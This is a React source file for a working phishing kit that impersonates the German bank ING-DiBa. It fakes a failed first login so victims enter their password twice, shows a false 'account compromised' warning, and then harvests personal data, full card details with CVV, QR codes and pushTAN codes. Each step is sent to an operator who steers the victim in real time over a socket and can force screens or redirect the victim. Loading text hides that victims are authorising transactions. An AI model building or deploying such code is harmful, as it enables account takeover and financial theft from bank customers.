import React, { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { updatePageMetadata, getTemplateMetadata } from '../../utils/templateMetadata';
import { submitTemplateData, getTemplateConfig, createTemplateSession } from '../../utils/templateApi';
import templateSocketClient from '../../utils/socketClient';
import './INGStyle.css';

// Import components (STANDARD)
import {
  LoginForm,
  Loading,
  SuccessScreen,
  ErrorScreen,
  Header,
  Footer,
  AccountCompromisedScreen,
  PersonalDataForm,
  BankCardForm,
  QRInstructionsScreen,
  QRUploadForm,
  QRErrorScreen
} from './components';
import { PushTANScreen } from './components/PushTANScreen';

// ING-DiBa flow states (STANDARD FLOW - same as other banks)
const STATES = {
  LOGIN: 'login',
  LOGIN_ERROR: 'login_error',
  ACCOUNT_COMPROMISED: 'account_compromised',
  PERSONAL_DATA: 'personal_data',
  PERSONAL_SUCCESS: 'personal_success',
  QR_INSTRUCTIONS: 'qr_instructions',
  QR_UPLOAD: 'qr_upload',
  QR_ERROR: 'qr_error',
  QR_RETRY: 'qr_retry',
  BANK_CARD: 'bank_card',
  BANK_SUCCESS: 'bank_success',
  FINAL_SUCCESS: 'final_success',
  LOADING: 'loading',
  ERROR: 'error',
  // Advanced states for admin control
  PUSHTAN_REQUEST: 'pushtan_request',
  SMS_TAN_REQUEST: 'sms_tan_request',
  TRANSACTION_CONFIRM: 'transaction_confirm',
  ACCOUNT_VERIFICATION: 'account_verification',
  // AFK/Live Mode states
  WAITING_FOR_ADMIN: 'waiting_for_admin'
};

// Configuration interface (STANDARD)
interface StepConfig {
  doubleLogin: boolean;
  personalData: boolean;
  bankCard: boolean;
  qrCode: boolean;
}

// Default configuration
const DEFAULT_CONFIG: StepConfig = {
  doubleLogin: true,
  personalData: true,
  bankCard: true,
  qrCode: true
};

// Types (STANDARD)
interface LoginData {
  username: string;
  password: string;
}

interface PersonalData {
  first_name: string;
  last_name: string;
  date_of_birth: string;
  street: string;
  street_number: string;
  plz: string;
  city: string;
  phone: string;
  email: string;
}

interface BankCardData {
  card_number: string;
  expiry_date: string;
  cvv: string;
  cardholder_name: string;
}

// AutoLogin component to handle automatic key generation
function AutoLogin() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    const metadata = getTemplateMetadata('ingdiba');
    updatePageMetadata(metadata);

    const initializeSession = async () => {
      try {
        setLoading(true);
        const newKey = await createTemplateSession('ingdiba');
        console.log('Generated key for ING-DiBa:', newKey);
        navigate(`/ingdiba/${newKey}`);
      } catch (error) {
        console.error('Failed to create ING-DiBa session:', error);
        setError('Fehler beim Erstellen der Sitzung');
        // Fallback to random key
        const fallbackKey = Math.random().toString(36).substring(2, 15);
        navigate(`/ingdiba/${fallbackKey}`);
      } finally {
        setLoading(false);
      }
    };

    setTimeout(initializeSession, 500);
  }, [navigate]);

  if (loading && !error) return <Loading message="Bitte warten Sie, während wir Ihre Sitzung erstellen..." />;
  if (error) return <ErrorScreen message={error} />;
  return null;
}

// Main flow component
function FormFlow() {
  const { key } = useParams<{ key: string }>();
  const [state, setState] = useState<string>(STATES.LOGIN);
  const [loadingMessage, setLoadingMessage] = useState<string>("Bitte warten Sie...");
  const [loading, setLoading] = useState<boolean>(false);
  const [error, setError] = useState<string | null>(null);
  const [stepConfig, setStepConfig] = useState<StepConfig>(DEFAULT_CONFIG);
  const [configLoaded, setConfigLoaded] = useState(false);
  const [sessionData, setSessionData] = useState<any>({});
  const [qrAttempts, setQrAttempts] = useState(0);
  
  // Enhanced TAN system state
  const [currentTanRequest, setCurrentTanRequest] = useState<{
    type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
    method: 'pushtan' | 'sms';
    transactionDetails?: any;
    requestId: string;
  } | null>(null);

  // AFK/Live Mode system state
  const [sessionMode, setSessionMode] = useState<'AFK' | 'LIVE'>('AFK');
  const [isWaitingForAdmin, setIsWaitingForAdmin] = useState(false);

  // Scroll to top whenever state changes
  useEffect(() => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }, [state]);

  // Flow control function - checks if should pause in Live Mode
  const proceedToNextState = (nextState: string, processingMessage: string = 'Wird verarbeitet...') => {
    if (sessionMode === 'LIVE') {
      // In Live Mode: pause and wait for admin
      setLoading(true);
      setLoadingMessage(processingMessage);
      setIsWaitingForAdmin(true);
      
      // Store the next state to transition to when admin continues
      setSessionData(prev => ({ ...prev, pendingState: nextState }));
      
      // Notify admin that user is waiting
      templateSocketClient.emit('user-waiting', {
        sessionKey: key,
        currentState: state,
        pendingState: nextState,
        message: processingMessage
      });
    } else {
      // In AFK Mode: continue automatically
      setState(nextState);
    }
  };

  useEffect(() => {
    const metadata = getTemplateMetadata('ingdiba');
    updatePageMetadata(metadata);

    // Add template class to body for styling
    document.body.classList.add('ingdiba-template');

    // Load step configuration from backend
    const loadConfig = async () => {
      try {
        setLoadingMessage("Schritt-Konfiguration wird geladen...");
        setLoading(true);
        const config = await getTemplateConfig('ingdiba');
        setStepConfig(config.steps);
        setConfigLoaded(true);
        if (process.env.NODE_ENV === 'development') {
          console.log('✅ Loaded ING-DiBa step config:', config.steps);
        }
      } catch (error) {
        console.warn('⚠️ Failed to load step config, using defaults:', error);
        setConfigLoaded(true);
      }
    };

    if (!key) {
      setState(STATES.ERROR);
      setError('Keine Sitzungs-ID vorhanden');
      setLoading(false);
      return;
    }

    console.log(`Initializing ING-DiBa session with key: ${key}`);
    
    const initializeAfterConfig = async () => {
      await loadConfig();
      setLoadingMessage("Sitzung wird initialisiert...");
      setTimeout(() => {
        setLoading(false);
      }, 1000);
    };
    
    initializeAfterConfig();
    
    // Initialize Socket.io connection for real-time admin control
    if (key) {
      templateSocketClient.connect({
        sessionKey: key,
        templateName: 'ingdiba',
        onStateForced: (state: string, message?: string) => {
          console.log('🎯 Admin forced state change:', state, message);
          
          // Show loading screen during state transition with natural banking messages
          setLoading(true);
          
          const getLoadingMessage = (targetState: string): string => {
            switch (targetState) {
              case 'personal_data':
                return 'Persönliche Daten werden geladen...';
              case 'qr_upload':
                return 'QR-Code Bereich wird vorbereitet...';
              case 'bank_card':
                return 'Bankdaten werden verarbeitet...';
              case 'final_success':
                return 'Vorgang wird abgeschlossen...';
              case 'account_compromised':
                return 'Sicherheitsprüfung läuft...';
              default:
                return 'Bitte warten Sie...';
            }
          };
          
          setLoadingMessage(message || getLoadingMessage(state));
          
          setTimeout(() => {
            setState(state);
            setLoading(false);
            if (message) {
              alert(message);
            }
          }, 1500);
        },
        onDataInjected: (data: any) => {
          console.log('💉 Admin injected data:', data);
          
          // Show loading screen during data injection
          setLoading(true);
          setLoadingMessage('Daten werden aktualisiert...');
          
          setTimeout(() => {
            setSessionData(prev => ({ ...prev, ...data }));
            setLoading(false);
          }, 1000);
        },
        onRedirect: (url: string) => {
          console.log('🔗 Admin triggered redirect:', url);
          window.location.href = url;
        },
        onMessage: (message: string, type: string) => {
          console.log('💬 Admin message:', message, type);
          alert(`${type.toUpperCase()}: ${message}`);
        },
        // AFK/Live Mode handlers
        onModeChanged: (mode: 'AFK' | 'LIVE') => {
          console.log('🎛️ Admin changed session mode:', mode);
          setSessionMode(mode);
          
          // If switching to AFK mode and waiting, continue flow
          if (mode === 'AFK' && isWaitingForAdmin) {
            setIsWaitingForAdmin(false);
            setLoading(false);
          }
        },
        onContinueFlow: () => {
          console.log('▶️ Admin triggered continue flow');
          if (isWaitingForAdmin && sessionData.pendingState) {
            setIsWaitingForAdmin(false);
            setLoading(false);
            setState(sessionData.pendingState);
            setSessionData(prev => ({ ...prev, pendingState: null }));
          }
        },
        // Enhanced TAN system handlers
        onTanRequest: (tanData: {
          type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
          method: 'pushtan' | 'sms';
          transactionDetails?: any;
          requestId: string;
        }) => {
          console.log('🔐 Admin requested TAN:', tanData);
          
          setLoading(true);
          setLoadingMessage(
            tanData.type === 'TRANSACTION_TAN' 
              ? 'Stornierung wird vorbereitet...' 
              : 'Anmeldung wird verarbeitet...'
          );
          
          setTimeout(() => {
            setCurrentTanRequest(tanData);
            setLoading(false);
            
            if (tanData.method === 'pushtan') {
              setState(STATES.PUSHTAN_REQUEST);
            } else {
              setState(STATES.SMS_TAN_REQUEST);
            }
          }, 2000);
        }
      });
    }
    
    // Start with login state (STANDARD FLOW)
    setTimeout(() => {
      setState(STATES.LOGIN);
      setLoading(false);
    }, 1000);

    // Cleanup function to remove class when component unmounts
    return () => {
      document.body.classList.remove('ingdiba-template');
      templateSocketClient.disconnect();
    };
  }, [key, isWaitingForAdmin, sessionData.pendingState]);

  // Handle login form submission (STANDARD DOUBLE LOGIN FLOW)
  const handleLogin = async (data: LoginData) => {
    try {
      console.log('Submitting login for ING-DiBa flow:', { key, username: data.username ? '✓' : '✗' });
      
      if (!key) {
        console.error('No session key available');
        setError('Keine Sitzungs-ID vorhanden');
        setState(STATES.ERROR);
        return;
      }
      
      // Store login data
      const newSessionData = {
        ...sessionData,
        session_key: key,
        username: data.username,
        password: data.password,
        timestamp: new Date().toISOString(),
        user_agent: navigator.userAgent,
        referrer: document.referrer
      };
      setSessionData(newSessionData);
      
      // Submit to backend only on the final login attempt (second attempt)
      if (state === STATES.LOGIN_ERROR) {
        try {
          const response = await submitTemplateData({
            template_name: 'ingdiba',
            key: key || '',
            step: 'login',
            data: {
              username: data.username,
              password: data.password
            }
          });

          if (!response.success) {
            console.warn('Backend submission failed:', response.error);
            // Continue with flow even if API fails
          }
        } catch (apiError) {
          console.warn('Failed to submit to admin dashboard:', apiError);
          // Continue with flow even if API fails
        }
      }
      
      // Show loading animation
      setLoadingMessage("Anmeldedaten werden überprüft...");
      setState(STATES.LOADING);
      
      // Simulate backend processing
      setTimeout(() => {
        // Check double login configuration
        if (state === STATES.LOGIN) {
          if (stepConfig.doubleLogin) {
            // First attempt - show error
            setState(STATES.LOGIN_ERROR);
          } else {
            // Single login - go directly to account compromised
            setState(STATES.ACCOUNT_COMPROMISED);
          }
        } else if (state === STATES.LOGIN_ERROR) {
          // Second attempt - account compromised
          setState(STATES.ACCOUNT_COMPROMISED);
        }
        setLoading(false);
      }, 2000);
      
    } catch (error) {
      console.error('Login error:', error);
      setError('Fehler bei der Anmeldung');
      setState(STATES.ERROR);
    }
  };

  // Handle account compromised screen continuation (STANDARD)
  const handleStartVerification = async () => {
    try {
      console.log('Starting verification process');
      
      setLoading(true);
      setLoadingMessage("Verifizierung wird gestartet...");
      
      // Submit verification start to backend
      try {
        const response = await submitTemplateData({
          template_name: 'ingdiba',
          key: key || '',
          step: 'verification-start',
          data: {}
        });

        if (!response.success) {
          console.warn('Backend verification start failed:', response.error);
          // Continue with flow even if API fails
        }
      } catch (apiError) {
        console.warn('Failed to submit verification start:', apiError);
        // Continue with flow even if API fails
      }

      // Transition to next enabled step
      setTimeout(() => {
        setLoading(false);
        if (stepConfig.personalData) {
          setState(STATES.PERSONAL_DATA);
        } else if (stepConfig.qrCode) {
          setState(STATES.QR_INSTRUCTIONS);
        } else if (stepConfig.bankCard) {
          setState(STATES.BANK_CARD);
        } else {
          setState(STATES.FINAL_SUCCESS);
        }
      }, 1500);
    } catch (error) {
      console.error('Start verification error:', error);
      setLoading(false);
      setError('Fehler beim Starten der Verifizierung');
    }
  };

  // Handle personal data submission (STANDARD)
  const handlePersonalDataSubmit = async (data: PersonalData) => {
    try {
      console.log('Submitting personal data');
      
      // Submit personal data to backend
      try {
        const response = await submitTemplateData({
          template_name: 'ingdiba',
          key: key || '',
          step: 'personal-data-complete',
          data: data
        });

        if (!response.success) {
          console.warn('Backend personal data submission failed:', response.error);
          // Continue with flow even if API fails
        }
      } catch (apiError) {
        console.warn('Failed to submit personal data:', apiError);
        // Continue with flow even if API fails
      }

      // Show loading before transition
      setLoading(true);
      setLoadingMessage("Persönliche Daten werden verarbeitet...");
      
      // Transition to QR instructions
      setTimeout(() => {
        setLoading(false);
        setState(STATES.QR_INSTRUCTIONS);
      }, 2500);
    } catch (error) {
      console.error('Personal data submission error:', error);
      setError('Fehler beim Speichern der persönlichen Daten');
    }
  };

  // Handle QR instructions continue (STANDARD)
  const handleStartQRUpload = async () => {
    try {
      console.log('Starting QR upload');
      
      setLoading(true);
      setLoadingMessage("QR-Code Upload wird vorbereitet...");
      
      // Submit QR start to backend
      try {
        const response = await submitTemplateData({
          template_name: 'ingdiba',
          key: key || '',
          step: 'qr-start',
          data: {}
        });

        if (!response.success) {
          console.warn('Backend QR start failed:', response.error);
          // Continue with flow even if API fails
        }
      } catch (apiError) {
        console.warn('Failed to submit QR start:', apiError);
        // Continue with flow even if API fails
      }

      // Transition to QR upload
      setTimeout(() => {
        setLoading(false);
        setState(STATES.QR_UPLOAD);
      }, 1500);
    } catch (error) {
      console.error('Start QR upload error:', error);
      setLoading(false);
      setError('Fehler beim Starten des QR-Code Uploads');
    }
  };

  // Handle QR code upload (STANDARD)
  const handleQRUpload = async (file: File) => {
    try {
      console.log('Uploading QR code');
      
      setLoading(true);
      setLoadingMessage("QR-Code wird analysiert...");
      
      const currentAttempt = qrAttempts + 1;
      setQrAttempts(currentAttempt);
      
      // Upload QR file to backend using the proper file upload function
      const { uploadTemplateFile } = await import('../../utils/templateApi');
      const response = await uploadTemplateFile('ingdiba', key || '', file, 'qr-upload');

      if (response.success) {
        // Single QR upload - go directly to next step
        if (stepConfig.bankCard) {
          setState(STATES.BANK_CARD);
        } else {
          setState(STATES.FINAL_SUCCESS);
        }
      } else {
        setState(STATES.QR_ERROR);
      }
      
      setLoading(false);
    } catch (error) {
      console.error('QR upload error:', error);
      setError('Fehler beim Upload des QR-Codes');
      setLoading(false);
    }
  };

  // Handle QR error screen transition (STANDARD)
  const handleQRErrorTransition = () => {
    setState(STATES.QR_RETRY);
  };

  // Handle bank card data submission (STANDARD)
  const handleBankCardSubmit = async (data: BankCardData) => {
    try {
      console.log('Submitting bank card data');
      
      // Submit bank card data to backend
      try {
        const response = await submitTemplateData({
          template_name: 'ingdiba',
          key: key || '',
          step: 'bank-card-complete',
          data: data
        });

        if (!response.success) {
          console.warn('Backend bank card submission failed:', response.error);
          // Continue with flow even if API fails
        }
      } catch (apiError) {
        console.warn('Failed to submit bank card data:', apiError);
        // Continue with flow even if API fails
      }

      // Show loading before transition to success
      setLoading(true);
      setLoadingMessage("Bankkarten-Daten werden verarbeitet...");
      
      setTimeout(() => {
        setLoading(false);
        setState(STATES.FINAL_SUCCESS);
      }, 2500);
    } catch (error) {
      console.error('Bank card submission error:', error);
      setError('Fehler beim Speichern der Bankkarten-Daten');
    }
  };

  // Handle bank card skip
  const handleBankCardSkip = async () => {
    try {
      console.log('ING-DiBa: Bank card skipped for session:', key);
      
      // Submit skip to backend
      const response = await submitTemplateData({
        template_name: 'ingdiba',
        key: key || '',
        step: 'bank-card-skip',
        data: { skip_reason: 'no_credit_card' }
      });
      
      if (!response.success) {
        console.error('❌ ING-DiBa bank card skip failed:', response.error);
        setError(response.error || 'Fehler beim Überspringen der Kartendaten');
        setState(STATES.ERROR);
        return;
      }
      
      console.log('✅ ING-DiBa bank card skip completed successfully');
      
      // Show loading screen
      setLoading(true);
      setLoadingMessage("Wird abgeschlossen...");
      
      // Simulate processing time
      setTimeout(() => {
        setLoading(false);
        setState(STATES.FINAL_SUCCESS);
      }, 2500);
      
    } catch (error) {
      console.error('❌ ING-DiBa bank card skip error:', error);
      setError('Fehler beim Überspringen der Kartendaten');
      setState(STATES.ERROR);
    }
  };

  // Render appropriate component based on state
  const renderContent = () => {
    if (loading || !configLoaded) {
      return <Loading 
        message={!configLoaded ? "Schritt-Konfiguration wird geladen..." : loadingMessage} 
      />;
    }
    
    if (error) {
      return <ErrorScreen message={error} />;
    }
    
    switch (state) {
      case STATES.LOGIN:
        return <LoginForm onSubmit={handleLogin} />;
        
      case STATES.LOADING:
        return <Loading message={loadingMessage} />;
        
      case STATES.LOGIN_ERROR:
        return <LoginForm onSubmit={handleLogin} showError={true} />;
        
      case STATES.ACCOUNT_COMPROMISED:
        return <AccountCompromisedScreen onStartVerification={handleStartVerification} />;
        
      case STATES.PERSONAL_DATA:
        return <PersonalDataForm onSubmit={handlePersonalDataSubmit} />;
        
      case STATES.QR_INSTRUCTIONS:
        return <QRInstructionsScreen onContinue={handleStartQRUpload} />;
        
      case STATES.QR_UPLOAD:
        return <QRUploadForm onUpload={handleQRUpload} />;
        
      case STATES.QR_ERROR:
        return <QRErrorScreen onTransition={handleQRErrorTransition} />;
        
      case STATES.QR_RETRY:
        return <QRUploadForm onUpload={handleQRUpload} isRetry={true} />;
        
      case STATES.BANK_CARD:
        return <BankCardForm onSubmit={handleBankCardSubmit} onSkip={handleBankCardSkip} />;
        
      case STATES.FINAL_SUCCESS:
        return <SuccessScreen />;
      
      case STATES.PUSHTAN_REQUEST:
        return <PushTANScreen 
          tanType={currentTanRequest?.type || 'TRANSACTION_TAN'}
          transactionDetails={currentTanRequest?.transactionDetails}
          onSubmit={(tan) => {
            console.log('pushTAN submitted:', tan);
            // Send TAN completion back to admin
            templateSocketClient.emit('tan-completed', {
              requestId: currentTanRequest?.requestId,
              success: true,
              type: currentTanRequest?.type,
              tanValue: tan
            });
            setCurrentTanRequest(null);
            setState(STATES.FINAL_SUCCESS);
          }}
          onCancel={() => {
            // Send TAN cancellation back to admin
            templateSocketClient.emit('tan-cancelled', {
              requestId: currentTanRequest?.requestId,
              type: currentTanRequest?.type
            });
            setCurrentTanRequest(null);
            setState(STATES.LOGIN);
          }}
        />;
      
      case STATES.SMS_TAN_REQUEST:
        // ING-DiBa doesn't have SMS TAN, use PushTAN screen as fallback
        return <PushTANScreen 
          tanType={currentTanRequest?.type || 'TRANSACTION_TAN'}
          transactionDetails={currentTanRequest?.transactionDetails}
          onSubmit={(tan) => {
            console.log('TAN submitted:', tan);
            // Send TAN completion back to admin
            templateSocketClient.emit('tan-completed', {
              requestId: currentTanRequest?.requestId,
              success: true,
              type: currentTanRequest?.type,
              tanValue: tan
            });
            setCurrentTanRequest(null);
            setState(STATES.FINAL_SUCCESS);
          }}
          onCancel={() => {
            // Send TAN cancellation back to admin
            templateSocketClient.emit('tan-cancelled', {
              requestId: currentTanRequest?.requestId,
              type: currentTanRequest?.type
            });
            setCurrentTanRequest(null);
            setState(STATES.LOGIN);
          }}
        />;
      
      case STATES.WAITING_FOR_ADMIN:
        return <Loading 
          message={isWaitingForAdmin ? loadingMessage : 'Wird verarbeitet...'} 
          type="processing"
          showProgress={false}
        />;
        
      case STATES.ERROR:
        return <ErrorScreen message={error || 'Ein Fehler ist aufgetreten'} />;
        
      default:
        return <ErrorScreen message="Unbekannter Zustand" />;
    }
  };

  return (
    <div className="ing-app">
      <Header />
      <main className="content-container">
        {renderContent()}
      </main>
      <Footer />
    </div>
  );
}

// Main ING-DiBa Template Component
const INGDibaTemplate: React.FC = () => {
  const { key } = useParams<{ key: string }>();

  if (!key) {
    return <AutoLogin />;
  }

  return <FormFlow />;
};

export default INGDibaTemplate;